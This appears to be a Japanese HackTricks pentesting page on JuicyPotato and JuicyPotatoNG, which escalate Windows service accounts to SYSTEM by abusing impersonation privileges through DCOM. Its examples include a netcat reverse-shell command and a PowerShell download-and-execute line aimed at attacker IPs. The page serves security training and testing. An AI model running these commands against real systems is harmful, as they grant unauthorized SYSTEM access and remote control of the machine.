# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotatoはレガシーです。通常はWindows 10 1803 / Windows Server 2016までのバージョンで動作します。MicrosoftがWindows 10 1809 / Server 2019以降で導入した変更により元の手法は破壊されました。これら以降のビルドでは、PrintSpoofer、RoguePotato、SharpEfsPotato/EfsPotato、GodPotatoなどの現代的な代替手段を検討してください。最新のオプションと使用法については下のページを参照してください。


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (ゴールデン特権の悪用) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_甘くしたバージョンの_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, 少しのjuiceを加えた、すなわち **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### juicypotatoは[https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)からダウンロードできます

### 互換性 — 簡単な注意点

- 現在のコンテキストが SeImpersonatePrivilege または SeAssignPrimaryTokenPrivilege を持っている場合、Windows 10 1803 と Windows Server 2016 まで安定して動作します。
- Windows 10 1809 / Windows Server 2019 以降での Microsoft のハードニングにより動作しません。これらのビルドでは上記の代替手段を推奨します。

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) は、[`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) が `127.0.0.1:6666` で MiTM リスナーを持ち、かつ `SeImpersonate` または `SeAssignPrimaryToken` 権限がある場合に基づく権限昇格チェーンを利用します。Windows のビルドレビューの際に、`BITS` が意図的に無効化され、ポート `6666` が使用されている設定を見つけました。

そこで [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) を武器化しました。**Juicy Potatoの登場です**。

> 理論については [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) を参照し、リンクと参照のチェーンを辿ってください。

我々は、`BITS` 以外にも悪用できるいくつかのCOMサーバーが存在することを発見しました。これらは次の条件を満たす必要があります:

1. 現在のユーザーによってインスタンス化可能であること。通常はインパーソネーション権限を持つ“service user”（サービスユーザー）。
2. `IMarshal` インターフェースを実装していること
3. SYSTEM、Administrator などの昇格したユーザーとして実行されていること

いくつかのテストの後、複数のWindowsバージョンで[interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) の広範なリストを取得してテストしました。

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotatoは次を可能にします:

- **Target CLSID** _任意の CLSID を選択できます._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _で OS ごとに整理されたリストが見つかります。_
- **COM Listening port** _好みの COM リスニングポートを定義できます（マシュアルされたハードコード 6666 の代わりに）_
- **COM Listening IP address** _サーバーを任意の IP にバインドできます_
- **Process creation mode** _インパーソネートされたユーザーの権限に応じて次から選択できます:_
  - `CreateProcessWithToken` (needs `SeImpersonate`)
  - `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
  - `both`
- **Process to launch** _エクスプロイトが成功した場合に実行ファイルやスクリプトを起動します_
- **Process Argument** _起動するプロセスの引数をカスタマイズできます_
- **RPC Server address** _ステルスなアプローチとして外部の RPC サーバーに対して認証することができます_
- **RPC Server port** _外部サーバーに認証したいがファイアウォールでポート `135` がブロックされている場合に有用です…_
- **TEST mode** _主にテスト目的、つまり CLSID のテスト用です。DCOM を作成しトークンのユーザーを出力します。テストについては_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)_

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 最終的な考察 <a href="#final-thoughts" id="final-thoughts"></a>

[**juicy-potato Readme から**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

ユーザに `SeImpersonate` または `SeAssignPrimaryToken` 権限があれば、あなたは **SYSTEM** です。

これらすべての COM Servers の悪用を完全に防ぐことはほとんど不可能です。`DCOMCNFG` を使ってこれらのオブジェクトの権限を変更することを考えるかもしれませんが、うまくいくとは限らず非常に困難でしょう。

実際の解決策は、`* SERVICE` アカウントで実行される機密アカウントやアプリケーションを保護することです。`DCOM` を停止すればこのエクスプロイトを抑制できる可能性はありますが、基盤となる OS に重大な影響を与える可能性があります。

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG は、以下を組み合わせることで modern Windows 上に JuicyPotato スタイルの local privilege escalation を再導入します:
- DCOM OXID resolution を選択したポート上のローカル RPC server に向けることで、古いハードコードされた 127.0.0.1:6666 リスナーを回避。
- SSPI hook を使って、`RpcImpersonateClient` を必要とせずに着信する SYSTEM 認証をキャプチャして偽装。これにより、`SeAssignPrimaryTokenPrivilege` のみがある場合でも `CreateProcessAsUser` が可能になる。
- DCOM アクティベーションの制約（例: PrintNotify / ActiveX Installer Service クラスを狙う際に以前必要だった INTERACTIVE-group 要件）を満たすためのトリック。

重要な注意（ビルドによって挙動が変化）:
- September 2022: 初期の手法は、“INTERACTIVE trick” を使用してサポートされている Windows 10/11 および Server ターゲットで動作しました。
- January 2023 update from the authors: Microsoft は後に INTERACTIVE trick をブロックしました。異なる CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) により再びエクスプロイトが可能になりますが、投稿によるとこれは Windows 11 / Server 2022 のみで有効です。

基本的な使用法（詳細はヘルプのフラグを参照）:
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
classic JuicyPotato がパッチ済みの Windows 10 1809 / Server 2019 を対象とする場合、ページ上部にリンクされている代替（RoguePotato、PrintSpoofer、EfsPotato/GodPotato など）を優先してください。NG はビルドやサービスの状態によって状況依存になる場合があります。

## 例

注: 試す CLSIDs の一覧については [this page](https://ohpe.it/juicy-potato/CLSID/) を参照してください。

### nc.exe のリバースシェルを取得する
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 新しい CMD を起動する（RDP アクセスがある場合）

![](<../../images/image (300).png>)

## CLSID の問題

多くの場合、JuicyPotato が使用するデフォルトの CLSID は **動作しない** ことがあり、exploit が失敗します。通常、**動作する CLSID** を見つけるには複数回の試行が必要です。特定のオペレーティングシステム用に試す CLSID の一覧を入手するには、次のページを参照してください：

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID の確認**

まず、juicypotato.exe 以外のいくつかの実行可能ファイルが必要です。

Join-Object.ps1 をダウンロードして PS セッションに読み込み、GetCLSID.ps1 をダウンロードして実行します。そのスクリプトはテスト用の候補 CLSID の一覧を作成します。

次に test_clsid.bat をダウンロードし（CLSID リストおよび juicypotato 実行ファイルへのパスを変更してください）、実行します。これが各 CLSID を順に試行し、**ポート番号が変わったときにその CLSID が動作したことを意味します**。

**-c パラメータを使用して動作する CLSID を確認してください**

## 参考

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
